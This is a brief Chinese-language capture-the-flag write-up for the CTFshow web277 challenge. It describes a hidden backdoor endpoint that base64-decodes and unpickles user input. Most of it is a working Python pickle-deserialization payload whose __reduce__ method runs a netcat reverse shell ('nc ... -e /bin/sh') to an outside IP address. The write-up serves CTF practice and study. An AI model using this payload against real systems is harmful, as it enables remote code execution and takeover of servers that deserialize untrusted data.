CTFSHOW-web277

  • 源码找到<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->

  • 传入一个data，base64解码后反序列化

  • 没有回显，所以需要反弹shell：

    import base64
import pickle


class shell(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 43.143.175.158 6666 -e /bin/sh')",))

k = shell()
print(base64.b64encode(pickle.dumps(k)))
